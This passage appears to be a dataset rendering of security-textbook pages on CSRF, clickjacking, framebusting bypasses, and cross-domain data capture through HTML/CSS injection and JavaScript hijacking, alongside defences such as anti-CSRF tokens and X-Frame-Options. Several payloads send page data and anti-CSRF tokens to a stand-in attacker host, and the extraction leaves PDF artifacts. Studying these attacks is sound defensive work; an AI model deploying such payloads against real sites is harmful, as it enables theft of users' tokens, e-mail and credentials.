uploaded\nthem. Suppose that the function can be used to perform stored XSS attacks,\nbecause no fi ltering of fi le contents occurs (see Chapter 12). This vulnerability\nmight appear to be harmless, on the basis that an attacker could only use it to\nattack himself. However, using CSRF techniques, an attacker can in fact exploit\nthe stored XSS vulnerability to compromise other users. As already described,\nthe attacker’s web page can make a CSRF request to force a victim user to log\nin using the attacker’s credentials. The attacker’s page can then make a CSRF\nrequest to download a malicious fi le. When the user’s browser processes this fi le,\nthe attacker’s XSS payload executes, and the user’s session with the vulnerable\napplication is compromised. Although the victim is currently logged in using\ncc1133..iinndddd 550077 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 508\n508 Chapter 13 n Attacking Users: Other Techniques\nthe attacker’s account, this need not be the end of the attack. As described in\nChapter 12, the XSS exploit can persist in the user’s browser and perform arbi-\ntrary actions, logging the user out of her current session with the vulnerable\napplication and inducing her to log back in using her own credentials.\nPreventing CSRF Flaws\nCSRF vulnerabilities arise because of how browsers automatically submit cookies\nback to the issuing web server with each subsequent request. If a web applica-\ntion relies solely on HTTP cookies as its mechanism for tracking sessions, it is\ninherently at risk from this type of attack.\nThe standard defense against CSRF attacks is to supplement HTTP cookies\nwith additional methods of tracking sessions. This typically takes the form\nof additional tokens that are transmitted via hidden fi elds in HTML forms.\nWhen each request is submitted, in addition to validating session cookies, the\napplication verifi es that the correct token was received in the form submission.\nAssuming that the attacker has no way to determine the value of this token,\nhe cannot construct a cross-domain request that succeeds in performing the\ndesired action.\nNOTE Even functions that are robustly defended using CSRF tokens may\nbe vulnerable to user interface (UI) redress attacks, as described later in this\nchapter.\nWhen anti-CSRF tokens are used in this way, they must be subjected to the\nsame safeguards as normal session tokens. If an attacker can predict the values\nof tokens that are issued to other users, he may be able to determine all the\nparameters required for a CSRF request and therefore still deliver an attack.\nFurthermore, if the anti-CSRF tokens are not tied to the session of the user to\nwhom they were issued, an attacker may be able to obtain a valid token within his\nown session and use this in a CSRF attack that targets a different user’s session.\nTRY IT!\nhttp://mdsec.net/auth/395/\nhttp://mdsec.net/auth/404/\nWARNING Some applications use relatively short anti-CSRF tokens on the\nassumption that they will not be subjected to brute-force attacks in the way\nthat short session tokens might be. Any attack that sent a range of possible\nvalues to the application would need to send these via the victim’s browser,\ninvolving a large number of requests that might easily be noticed. Furthermore,\ncc1133..iinndddd 550088 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 509\nChapter 13 n Attacking Users: Other Techniques 509\nthe application may defensively terminate the user’s session if it receives too\nmany invalid anti-CSRF tokens, thereby stalling the attack.\nHowever, this ignores the possibility of performing a brute-force attack purely on\nthe client side, without sending any requests to the server. In some situations,\nthis attack can be performed using a CSS-based technique to enumerate a user’s\nbrowsing history. For such an attack to succeed, two conditions must hold:\nn The application must sometimes transmit an anti-CSRF token within the\nURL query string. This is often the case, because many protected func-\ntions are accessed via simple hyperlinks containing a token within the\ntarget URL.\nn The application must either use the same anti-CSRF token throughout the\nuser’s session or tolerate the use of the same token more than once. This\nis often the case to enhance the user’s experience and allow use of the\nbrowser’s back and forward buttons.\nIf these conditions hold, and the target user has already visited a URL that\nincludes an anti-CSRF token, the attacker can perform a brute-force attack from\nhis own page. Here, a script on the attacker’s page dynamically creates hyper-\nlinks to the relevant URL on the target application, including a different value\nfor the anti-CSRF token in each link. It then uses the JavaScript API getCom-\nputedStyle to test whether the user has visited the link. When a visited link is\nidentifi ed, a valid anti-CSRF token has been found, and the attacker’s page can\nthen use it to perform sensitive actions on the user’s behalf.\nNote that to defend against CSRF attacks, it is not suffi cient simply to perform\nsensitive actions using a multistage process. For example, when an administra-\ntor adds a new user account, he might enter the relevant details at the fi rst stage\nand then review and confi rm the details at the second stage. If no additional\nanti-CSRF tokens are being used, the function is still vulnerable to CSRF, and\nan attacker can simply issue the two required requests in turn, or (very often)\nproceed directly to the second request.\nOccasionally, an application function employs an additional token that is\nset in one response and submitted in the next request. However, the transition\nbetween these two steps involves a redirection, so the defense achieves nothing.\nAlthough CSRF is a one-way attack and cannot be used to read tokens from\napplication responses, if a CSRF response contains a redirection to a different\nURL containing a token, the victim’s browser automatically follows the redirect\nand automatically submits the token with this request.\nTRY IT!\nhttp://mdsec.net/auth/398/\ncc1133..iinndddd 550099 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 510\n510 Chapter 13 n Attacking Users: Other Techniques\nDo not make the mistake of relying on the HTTP Referer header to indicate\nwhether a request originated on-site or off-site. The Referer header can be\nspoofed using older versions of Flash or masked using a meta refresh tag. In\ngeneral, the Referer header is not a reliable foundation on which to build any\nsecurity defenses within web applications.\nDefeating Anti-CSRF Defenses Via XSS\nIt is often claimed that anti-CSRF defenses can be defeated if the application\ncontains any XSS vulnerabilities. But this is only partly true. The thought behind\nthe claim is correct—that because XSS payloads execute on-site, they can perform\ntwo-way interaction with the application and therefore can retrieve tokens from\nthe application’s responses and submit them in subsequent requests.\nHowever, if a page that is itself protected by anti-CSRF defenses also contains\na refl ected XSS fl aw, this fl aw cannot easily be used to break the defenses. Don’t\nforget that the initial request in a refl ected XSS attack is itself cross-site. The\nattacker crafts a URL or POST request containing malicious input that gets copied\ninto the application’s response. But if the vulnerable page implements anti-CSRF\ndefenses, the attacker’s crafted request must already contain the required token\nto succeed. If it does not, the request is rejected, and the code path containing\nthe refl ected XSS fl aw does not execute. The issue here is not whether injected\nscript can read any tokens contained in the application’s response (of course\nit can). The issue is about getting the script into a response containing those\ntokens in the fi rst place.\nIn fact, there are several situations in which XSS vulnerabilities can be exploited\nto defeat anti-CSRF defenses:\nn If there are any stored XSS fl aws within the defended functionality, these\ncan always be exploited to defeat the defenses. JavaScript injected via\nthe stored attack can directly read the tokens contained within the same\nresponse that the script appears in.\nn If the application employs anti-CSRF defenses for only part of its func-\ntionality, and a refl ected XSS fl aw exists in a function that is not defended\nagainst CSRF, that fl aw can be exploited to defeat the anti-CSRF defenses.\nFor example, if an application employs anti-CSRF tokens to protect only\nthe second step of a funds transfer function, an attacker can leverage a\nrefl ected XSS attack elsewhere to defeat the defense. A script injected via\nthis fl aw can make an on-site request for the fi rst step of the funds trans-\nfer, retrieve the token, and use this to request the second step. The attack\nis successful because the fi rst step of the transfer, which is not defended\nagainst CSRF, returns the token needed to access the defended page. The\nreliance on only HTTP cookies to reach the fi rst step means that it can be\nleveraged to gain access to the token defending the second step.\ncc1133..iinndddd 551100 88//1199//22001111 1122::1133::5588 PPMM"
  },
  {
    "input": "UI Redress",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 511\nChapter 13 n Attacking Users: Other Techniques 511\nn In some applications, anti-CSRF tokens are tied only to the current user,\nand not to his session. In this situation, if the login form is not protected\nagainst CSRF, a multistage exploit may still be possible. First, the attacker\nlogs in to his own account to obtain a valid anti-CSRF token that is tied\nto his user identity. He then uses CSRF against the login form to force\nthe victim user to log in using the attacker’s credentials, as was already\ndescribed for the exploitation of same-user stored XSS vulnerabilities.\nOnce the user is logged in as the attacker, the attacker uses CSRF to cause\nthe user to issue a request exploiting the XSS bug, using the anti-CSRF\ntoken previously acquired by the attacker. The attacker’s XSS payload\nthen executes in the user’s browser. Since the user is still logged in as the\nattacker, the XSS payload may need to log the user out again and induce\nthe user to log back in, with the result that the user’s login credentials\nand resulting application session are fully compromised.\nn If anti-CSRF tokens are tied not to the user but to the current session,\na variation on the preceding attack may be possible if any methods are\navailable for the attacker to inject cookies into the user’s browser (as\ndescribed later in this chapter). Instead of using a CSRF attack against\nthe login form with the attacker’s own credentials, the attacker can\ndirectly feed to the user both his current session token and the anti-\nCSRF token that is tied to it. The remainder of the attack then proceeds\nas previously described.\nThese scenarios aside, robust defenses against CSRF attacks do in many situa-\ntions make it considerably harder, if not impossible, to exploit some refl ected XSS\nvulnerabilities. However, it goes without saying that any XSS conditions in an\napplication should always be fi xed, regardless of any anti-CSRF protections in place\nthat may, in some situations, frustrate an attacker who is seeking to exploit them.\nUI Redress\nFundamentally, anti-CSRF defenses involving tokens within the page aim to\nensure that requests made by a user originate from that user’s actions within the\napplication itself and are not induced by some third-party domain. UI redress\nattacks are designed to allow a third-party site to induce user actions on another\ndomain even if anti-CSRF tokens are being used. These attacks work because,\nin the relevant sense, the resulting requests actually do originate within the\napplication being targeted. UI redress techniques are also often referred to as\n“clickjacking,” “strokejacking,” and other buzzwords.\nIn its basic form, a UI redress attack involves the attacker’s web page load-\ning the target application within an iframe on the attacker’s page. In effect,\nthe attacker overlays the target application’s interface with a different interface\ncc1133..iinndddd 551111 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 512\n512 Chapter 13 n Attacking Users: Other Techniques\nprovided by the attacker. The attacker’s interface contains content to entice the\nuser and induce him to perform actions such as clicking the mouse in a par-\nticular region of the page. When the user performs these actions, although it\nappears that he is clicking the buttons and other UI elements that are visible in\nthe attacker’s interface, he is unwittingly interacting with the interface of the\napplication that is being targeted.\nFor example, suppose a banking function to make a payment transfer involves\ntwo steps. In the fi rst step, the user submits the details of the transfer. The response\nto this request displays these details, and also a button to confi rm the action\nand make the payment. Furthermore, in an attempt to prevent CSRF attacks,\nthe form in the response includes a hidden fi eld containing an unpredictable\ntoken. This token is submitted when the user clicks the confi rm button, and the\napplication verifi es its value before transferring the funds.\nIn the UI redress attack, the attacker’s page submits the fi rst request in this\nprocess using conventional CSRF. This is done in an iframe within the attacker’s\npage. As it does normally, the application responds with the details of the user\nto be added and a button to confi rm the action. This response is “displayed”\nwithin the attacker’s iframe, which is overlaid with the attacker’s interface\ndesigned to induce the victim to click the region containing the confi rm but-\nton. When the user clicks in this region, he is unwittingly clicking the confi rm\nbutton in the target application, so the new user gets created. This basic attack\nis illustrated in Figure 13-1.\nFigure 13-1: A basic UI redress attack\nThe reason this attack succeeds, where a pure CSRF attack would fail, is\nthat the anti-CSRF token used by the application is processed in the normal\nway. Although the attacker’s page cannot read the value of this token due to\nthe same-origin policy, the form in the attacker’s iframe includes the token\ncc1133..iinndddd 551122 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 513\nChapter 13 n Attacking Users: Other Techniques 513\ngenerated by the application, and it submits this back to the application when\nthe victim unwittingly clicks the confi rm button. As far as the target application\nis concerned, everything is normal.\nTo deliver the key trick of having the victim user see one interface but interact\nwith a different one, the attacker can employ various CSS techniques. The iframe\nthat loads the target interface can be made an arbitrary size, in an arbitrary loca-\ntion within the attacker’s page, and showing an arbitrary location within the\ntarget page. Using suitable style attributes, it can be made completely transpar-\nent so that the user cannot see it.\nTRY IT!\nhttp://mdsec.net/auth/405/\nDeveloping the basic attack further, the attacker can use complex script code\nwithin his interface to induce more elaborate actions than simply clicking a but-\nton. Suppose an attack requires the user to enter some text into an input fi eld\n(for example, in the amount fi eld of a funds transfer page). The attacker’s user\ninterface can contain some content that induces the user to type (for example,\na form to enter a phone number to win a prize). A script on the attacker’s page\ncan selectively handle keystrokes so that when a desired character is typed,\nthe keystroke event is effectively passed to the target interface to populate the\nrequired input fi eld. If the user types a character that the attacker does not want\nto enter into the target interface, the keystroke is not passed to that interface,\nand the attacker’s script waits for the next keystroke.\nIn a further variation, the attacker’s page can contain content that induces\nthe user to perform mouse-dragging actions, such as a simple game. Script\nrunning on the attacker’s page can selectively handle the resulting events in\na way that causes the user to unwittingly select text within the target applica-\ntion’s interface and drag it into an input fi eld in the attacker’s interface, or vice\nversa. For example, when targeting a web mail application, the attacker could\ninduce the user to drag text from an e-mail message into an input fi eld that\nthe attacker can read. Alternatively, the user could be made to create a rule to\nforward all e-mail to the attacker and drag the required e-mail address from\nthe attacker’s interface into the relevant input fi eld in the form that defi nes the\nrule. Furthermore, since links and images are dragged as URLs, the attacker\nmay be able to induce dragging actions to capture sensitive URLs, including\nanti-CSRF tokens, from the target application’s interface.\nA useful explanation of these and other attack vectors, and the methods by\nwhich they may be delivered, can be found here:\nhttp://ui-redressing.mniemietz.de/uiRedressing.pdf\ncc1133..iinndddd 551133 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 514\n514 Chapter 13 n Attacking Users: Other Techniques\nFramebusting Defenses\nWhen UI redress attacks were fi rst widely discussed, many high-profi le web\napplications sought to defend against them using a defensive technique known\nas framebusting. In some cases this was already being used to defend against\nother frame-based attacks.\nFramebusting can take various forms, but it essentially involves each relevant\npage of an application running a script to detect if it is being loaded within an\niframe. If so, an attempt is made to “bust” out of the iframe, or some other\ndefensive action is performed, such as redirecting to an error page or refusing\nto display the application’s own interface.\nA Stanford University study in 2010 examined the framebusting defenses used\nby 500 top websites. It found that in every instance these could be circumvented in\none way or another. How this can be done depends on the specifi c details of each\ndefense, but can be illustrated using a common example of framebusting code:\n<script>\nif (top.location != self.location)\n{ top.location = self.location }\n</script>\nThis code checks whether the URL of the page itself matches the URL of the\ntop frame in the browser window. If it doesn’t, the page has been loaded within\na child frame. In that case the script tries to break out of the frame by reloading\nitself into the top-level frame in the window.\nAn attacker performing a UI redress attack can circumvent this defense to\nsuccessfully frame the target page in several ways:\nn Since the attacker’s page controls the top-level frame, it can redefi ne the\nmeaning of top.location so that an exception occurs when a child frame\ntries to reference it. For example, in Internet Explorer, the attacker can\nrun the following code:\nvar location = ‘foo’;\nThis redefi nes location as a local variable in the top-level frame so that\ncode running in a child frame cannot access it.\nn The top-level frame can hook the window.onbeforeunload event so that\nthe attacker’s event handler is run when the framebusting code tries to\nset the location of the top-level frame. The attacker’s code can perform a\nfurther redirect to a URL that returns an HTTP 204 (No Content) response.\nThis causes the browser to cancel the chain of redirection calls and leaves\nthe URL of the top-level frame unchanged.\nn The top-level frame can defi ne the sandbox attribute when loading the\ntarget application into a child frame. This disables scripting in the child\nframe while leaving its cookies enabled.\ncc1133..iinndddd 551144 88//1199//22001111 1122::1133::5588 PPMM"
  },
  {
    "input": "Capturing Data Cross-Domain",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 515\nChapter 13 n Attacking Users: Other Techniques 515\nn The top-level frame can leverage the IE XSS fi lter to selectively disable the\nframebusting script within the child frame, as described in Chapter 12. When\nthe attacker’s page specifi es the URL for the iframe target, it can include a\nnew parameter whose value contains a suitable part of the framebusting\nscript. The IE XSS fi lter identifi es script code within both the parameter\nvalue and the response from the target application and disables the script\nin the response in an effort to protect the user.\nTRY IT!\nhttp://mdsec.net/auth/406/\nPreventing UI Redress\nThe current consensus is that although some kinds of framebusting code may\nhinder UI redress attacks in some situations, this technique should not be relied\non as a surefi re defense against these attacks.\nA more robust method for an application to prevent an attacker from fram-\ning its pages is to use the X-Frame-Options response header. It was introduced\nwith Internet Explorer 8 and has since been implemented in most other popular\nbrowsers. The X-Frame-Options header can take two values. The value deny\ninstructs the browser to prevent the page from being framed, and sameorigin\ninstructs the browser to prevent framing by third-party domains.\nTIP When analyzing any antiframing defenses employed within an applica-\ntion, always review any related versions of the interface that are tailored for\nmobile devices. For example, although wahh-app.com/chat/ might defend\nrobustly against framing attacks, there may be no defenses protecting wahh-\napp.com/mobile/chat/. Application owners often overlook mobile versions\nof the user interface when devising antiframing defenses, perhaps on the\nassumption that a UI redress attack would be impractical on a mobile device.\nHowever, in many cases, the mobile version of the application runs as normal\nwhen accessed using a standard (nonmobile) browser, and user sessions are\nshared between both versions of the application.\nCapturing Data Cross-Domain\nThe same-origin policy is designed to prevent code running on one domain\nfrom accessing content delivered from a different domain. This is why cross-\nsite request forgery attacks are often described as “one-way” attacks. Although\ncc1133..iinndddd 551155 88//1199//22001111 1122::1133::5588 PPMM"
  },
  {
    "input": "Capturing Data by Injecting HTML",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 516\n516 Chapter 13 n Attacking Users: Other Techniques\none domain may cause requests to a different domain, it may not easily read\nthe responses from those requests to steal the user’s data from a different\ndomain.\nIn fact, various techniques can be used in some situations to capture all or\npart of a response from a different domain. These attacks typically exploit some\naspect of the target application’s functionality together with some feature of\npopular browsers to allow cross-domain data capture in a way that the same-\norigin policy is intended to prevent.\nCapturing Data by Injecting HTML\nMany applications contain functionality that allows an attacker to inject some\nlimited HTML into a response that is received by a different user in a way that\nfalls short of a full XSS vulnerability. For example, a web mail application may\ndisplay e-mails containing some HTML markup but block any tags and attributes\nthat can be used to execute script code. Or a dynamically generated error mes-\nsage may fi lter a range of expressions but still allow some limited use of HTML.\nIn these situations, it may be possible to leverage the HTML-injection condi-\ntion to cause sensitive data within the page to be sent to the attacker’s domain.\nFor example, in a web mail application, the attacker may be able to capture the\ncontents of a private e-mail message. Alternatively, the attacker may be able to\nread an anti-CSRF token being used within the page, allowing him to deliver\na CSRF attack to forward the user’s e-mail messages to an arbitrary address.\nSuppose the web mail application allows injection of limited HTML into the\nfollowing response:\n[ limited HTML injection here ]\n<form action=”http://wahh-mail.com/forwardemail” method=”POST”>\n<input type=”hidden” name=”nonce” value=”2230313740821”>\n<input type=”submit” value=”Forward”>\n...\n</form>\n...\n<script>\nvar _StatsTrackerId=’AAE78F27CB3210D’;\n...\n</script>\nFollowing the injection point, the page contains an HTML form that includes\na CSRF token. In this situation, an attacker could inject the following text into\nthe response:\n<img src=’http://mdattacker.net/capture?html=\nThis snippet of HTML opens an image tag targeting a URL on the attacker’s\ndomain. The URL is encapsulated in single quotation marks, but the URL string\ncc1133..iinndddd 551166 88//1199//22001111 1122::1133::5599 PPMM"
  },
  {
    "input": "Capturing Data by Injecting CSS",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 517\nChapter 13 n Attacking Users: Other Techniques 517\nis not terminated, and the <img> tag is not closed. This causes the browser to\ntreat the text following the injection point as part of the URL, up until a single\nquotation mark is encountered, which happens later in the response when a\nquoted JavaScript string appears. Browsers tolerate all the intervening characters\nand the fact that the URL spans several lines.\nWhen the user’s browser processes the response into which the attacker has\ninjected, it attempts to fetch the specifi ed image and makes a request to the\nfollowing URL, thereby sending the sensitive anti-CSRF token to the attacker’s\nserver:\nhttp://mdattacker.net/capture?html=<form%20action=”http://wahh-mail.com/\nforwardemail”%20method=”POST”><input%20type=”hidden”%20name=”nonce”%20value=\n“2230313740821”><input%20type=”submit”%20value=”Forward”>...</form>...\n<script> var%20_StatsTrackerId=\nAn alternative attack would be to inject the following text:\n<form action=”http://mdattacker.net/capture” method=”POST”>\nThis attack injects a <form> tag targeting the attacker’s domain before the <form>\ntag used by the application itself. In this situation, when browsers encounter\nthe nested <form> tag, they ignore it and process the form in the context of the\nfi rst <form> tag that was encountered. Hence, if the user submits the form, all\nits parameters, including the sensitive anti-CSRF token, are submitted to the\nattacker’s server:\nPOST /capture HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 192\nHost: mdattacker.net\nnonce=2230313740821&...\nSince this second attack injects only well-formed HTML, it may be more\neffective against fi lters designed to allow a subset of HTML in echoed inputs.\nHowever, it also requires some user interaction to succeed, which may reduce\nits effectiveness in some situations.\nCapturing Data by Injecting CSS\nIn the examples discussed in the preceding section, it was necessary to use some\nlimited HTML markup in the injected text to capture part of the response cross-\ndomain. In many situations, however, the application blocks or HTML-encodes\nthe characters < and > in the injected input, preventing the introduction of any\nnew HTML tags. Pure text injection conditions like this are common in web\napplications and are often considered harmless.\ncc1133..iinndddd 551177 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 518\n518 Chapter 13 n Attacking Users: Other Techniques\nFor example, in a web mail application, an attacker may be able to introduce\nsome limited text into the response of a target user via the subject line of an\ne-mail. In this situation, the attacker may be able to capture sensitive data cross-\ndomain by injecting CSS code into the application.\nIn the example already discussed, suppose the attacker sends an e-mail with\nthis subject line:\n{}*{font-family:’\nSince this does not contain any HTML metacharacters, it will be accepted\nby most applications and displayed unmodifi ed in responses to the recipi-\nent user. When this happens, the response returned to the user might look\nlike this:\n<html>\n<head>\n<title>WahhMail Inbox</title>\n</head>\n<body>\n...\n<td>{}*{font-family:’</td>\n...\n<form action=”http://wahh-mail.com/forwardemail” method=”POST”>\n<input type=”hidden” name=”nonce” value=”2230313740821”>\n<input type=”submit” value=”Forward”>\n...\n</form>\n...\n<script>\nvar _StatsTrackerId=’AAE78F27CB3210D’;\n...\n</script>\n</body>\n</html>\nThis response obviously contains HTML. Surprisingly, however, some brows-\ners allow this response to be loaded as a CSS stylesheet and happily process any\nCSS defi nitions it contains. In the present case, the injected response defi nes the\nCSS font-family property and starts a quoted string as the property defi nition.\nThe attacker’s injected text does not close the string, so it continues through the\nrest of the response, including the hidden form fi eld containing the sensitive\nanti-CSRF token. (Note that it is not necessary for CSS defi nitions to be quoted.\nHowever, if they are not, they terminate at the next semicolon character, which\nmay occur before the sensitive data that the attacker wants to capture.)\nTo exploit this behavior, an attacker needs to host a page on his own domain\nthat includes the injected response as a CSS stylesheet. This causes any embed-\nded CSS defi nitions to be applied within the attacker’s own page. These can\ncc1133..iinndddd 551188 88//1199//22001111 1122::1133::5599 PPMM"
  },
  {
    "input": "JavaScript Hijacking",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 519\nChapter 13 n Attacking Users: Other Techniques 519\nthen be queried using JavaScript to retrieve the captured data. For example, the\nattacker can host a page containing the following:\n<link rel=”stylesheet” href=”https://wahh-mail.com/inbox” type=”text/\ncss”>\n<script>\ndocument.write(‘<img src=”http://mdattacker.net/capture?’ +\nescape(document.body.currentStyle.fontFamily) + ‘”>’);\n</script>\nThis page includes the relevant URL from the web mail application as a\nstylesheet and then runs a script to query the font-family property, which\nhas been defi ned within the web mail application’s response. The value of\nthe font-family property, including the sensitive anti-CSRF token, is then\ntransmitted to the attacker’s server via a dynamically generated request for\nthe following URL:\nhttp://mdattacker.net/capture?%27%3C/td%3E%0D%0A...%0D%0A%3Cform%20\naction%3D%22 http%3A//wahh-mail.com/forwardemail%22%20method%3D%22POST%2\n2%3E%0D%0A%3Cinput%2 0type%3D%22hidden%22%20name%3D%22nonce%22%20value%3\nD%222230313740821%22%3E%0D %0A%3Cinput%20type%3D%22submit%22%20value%3D%\n22Forward%22%3E%0D%0A...%0D%0A%3C/ form%3E%0D%0A...%0D%0A%3Cscript%3E%0D\n%0Avar%20_StatsTrackerId%3D%27AAE78F27CB32 10D%27\nThis attack works on current versions of Internet Explorer. Other browsers\nhave modifi ed their handling of CSS includes to prevent the attack from work-\ning, and it is possible that IE may also do this in the future.\nJavaScript Hijacking\nJavaScript hijacking provides a further method of capturing data cross-domain,\nturning CSRF into a limited “two-way” attack. As described in Chapter 3, the\nsame-origin policy allows one domain to include script code from another\ndomain, and this code executes in the context of the invoking domain, not the\nissuing domain. This provision is harmless provided that application responses\nthat are executable using a cross-domain script contain only nonsensitive code,\nwhich is static and accessible by any application user. However, many of today’s\napplications use JavaScript to transmit sensitive data, in a way that was not\nforeseen when the same-origin policy was devised. Furthermore, developments\nin browsers mean that an increasing range of syntax is becoming executable\nas valid JavaScript, with new opportunities for capturing data cross-domain.\nThe changes in application design that fall under the broad “2.0” umbrella\ninclude new ways of using JavaScript code to transmit sensitive data from the\nserver to the client. In many situations, a fast and effi cient way to update the\nuser interface via asynchronous requests to the server is to dynamically include\nscript code that contains, in some form, the user-specifi c data that needs to be\ndisplayed.\ncc1133..iinndddd 551199 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 520\n520 Chapter 13 n Attacking Users: Other Techniques\nThis section examines various ways in which dynamically executed script\ncode can be used to transmit sensitive data. It also considers how this code can\nbe hijacked to capture the data from a different domain.\nFunction Callbacks\nConsider an application that displays the current user’s profi le information\nwithin the user interface when she clicks the appropriate tab. To provide a\nseamless user experience, the information is fetched using an asynchronous\nrequest. When the user clicks the Profi le tab, some client-side code dynamically\nincludes the following script:\nhttps://mdsec.net/auth/420/YourDetailsJson.ashx\nThe response from this URL contains a callback to an already-defi ned func-\ntion that displays the user’s details within the UI:\nshowUserInfo(\n[\n[ ‘Name’, ‘Matthew Adamson’ ],\n[ ‘Username’, ‘adammatt’ ],\n[ ‘Password’, ‘4nl1ub3’ ],\n[ ‘Uid’, ‘88’ ],\n[ ‘Role’, ‘User’ ]\n]);\nAn attacker can capture these details by hosting his own page that imple-\nments the showUserInfo function and includes the script that delivers the profi le\ninformation. A simple proof-of-concept attack is as follows:\n<script>\nfunction showUserInfo(x) { alert(x); }\n</script>\n<script src=”https://mdsec.net/auth/420/YourDetailsJson.ashx”>\n</script>\nIf a user who accesses the attacker’s page is simultaneously logged in to the\nvulnerable application, the attacker’s page dynamically includes the script\ncontaining the user’s profi le information. This script calls the showUserInfo\nfunction, as implemented by the attacker, and his code receives the user’s profi le\ndetails, including, in this instance, the user’s password.\nTRY IT!\nhttp://mdsec.net/auth/420/\ncc1133..iinndddd 552200 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 521\nChapter 13 n Attacking Users: Other Techniques 521\nJSON\nIn a variation on the preceding example, the application does not perform a\nfunction callback in the dynamically invoked script, but instead just returns\nthe JSON array containing the user’s details:\n[\n[ ‘Name’, ‘Matthew Adamson’ ],\n[ ‘Username’, ‘adammatt’ ],\n[ ‘Password’, ‘4nl1ub3’ ],\n[ ‘Uid’, ‘88’ ],\n[ ‘Role’, ‘User’ ]\n]\nAs described in Chapter 3, JSON is a fl exible notation for representing arrays\nof data and can be consumed directly by a JavaScript interpreter.\nIn older versions of Firefox, it was possible to perform a cross-domain script\ninclude attack to capture this data by overriding the default Array constructor\nin JavaScript. For example:\n<script>\nfunction capture(s) {\nalert(s);\n}\nfunction Array() {\nfor (var i = 0; i < 5; i++)\nthis[i] setter = capture;\n}\n</script>\n<script src=”https://mdsec.net/auth/409/YourDetailsJson.ashx”>\n</script>\nThis attack modifi es the default Array object and defi nes a custom setter\nfunction, which is invoked when values are assigned to elements in an array. It\nthen executes the response containing the JSON data. The JavaScript interpreter\nconsumes the JSON data, constructs an Array to hold its values, and invokes\nthe attacker’s custom setter function for each value in the array.\nSince this type of attack was discovered in 2006, the Firefox browser has been\nmodifi ed so that custom setters are not invoked during array initialization. This\nattack is not possible in current browsers.\nTRY IT!\nhttp://mdsec.net/auth/409/\nYou need to download version 2.0 of Firefox to exploit this example. You\ncan download this from the following URL:\nwww.oldapps.com/firefox.php?old_firefox=26\ncc1133..iinndddd 552211 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 522\n522 Chapter 13 n Attacking Users: Other Techniques\nVariable Assignment\nConsider a social networking application that makes heavy use of asynchronous\nrequests for actions such as updating status, adding friends, and posting com-\nments. To deliver a fast and seamless user experience, parts of the user interface\nare loaded using dynamically generated scripts. To prevent standard CSRF\nattacks, these scripts include anti-CSRF tokens that are used when performing\nsensitive actions. Depending on how these tokens are embedded within the\ndynamic scripts, it may be possible for an attacker to capture the tokens by\nincluding the relevant scripts cross-domain.\nFor example, suppose a script returned by the application on wahh-network\n.com contains the following:\n...\nvar nonce = ‘222230313740821’;\n...\nA simple proof-of-concept attack to capture the nonce value cross-domain\nwould be as follows:\n<script src=”https://wahh-network.com/status”>\n</script>\n<script>\nalert(nonce);\n</script>\nIn a different example, the value of the token may be assigned within a function:\nfunction setStatus(status)\n{\n...\nnonce = ‘222230313740821’;\n...\n}\nIn this situation, the following attack would work:\n<script src=”https://wahh-network.com/status”>\n</script>\n<script>\nsetStatus(‘a’);\nalert(nonce);\n</script>\nVarious other techniques may apply in different situations with variable\nassignments. In some cases the attacker may need to implement a partial replica\nof the target application’s client-side logic to be able to include some of its scripts\nand capture the values of sensitive items.\ncc1133..iinndddd 552222 88//1199//22001111 1122::1133::5599 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 523\nChapter 13 n Attacking Users: Other Techniques 523\nE4X\nIn the recent past, E4X has been a fast-evolving area, with browser behavior\nbeing frequently updated in response to exploitable conditions that have been\nidentifi ed in numerous real-world applications.\nE4X is an extension to ECMAScript languages (including JavaScript) that adds\nnative support for the XML language. At the present time, it is implemented in\ncurrent versions of the Firefox browser. Although it has since been fi xed, a classic\nexample of cross-domain data capture can be found in Firefox’s handling of E4X.\nAs well as allowing direct usage of XML syntax within JavaScript, E4X allows\nnested calls to JavaScript from within XML:\nvar foo=<bar>{prompt(‘Please enter the value of bar.’)}</bar>;\nThese features of E4X have two signifi cant consequences for cross-domain\ndata-capture attacks:\nn A piece of well-formed XML markup is treated as a value that is not\nassigned to any variable.\nn Text nested in a {...} block is executed as JavaScript to initialize the\nrelevant part of the XML data.\nMuch well-formed HTML is also well-formed XML, meaning that it can be\nconsumed as E4X. Furthermore, much HTML includes script code in a {...}\nblock that contains sensitive data. For example:\n<html>\n<head>\n<script>\n...\nfunction setNonce()\n{\nnonce = ‘222230313740821’;\n}\n...\n</script>\n</head>\n<body>\n...\n</body>\n</html>\nIn earlier versions of Firefox, it was possible to perform a cross-domain script\ninclude of a full HTML response like this and have some of the embedded\nJavaScript execute within the attacker’s domain.\ncc1133..iinndddd 552233 88//1199//22001111 1122::1133::5599 PPMM"
  },
  {
    "input": "The Same-Origin Policy Revisited",
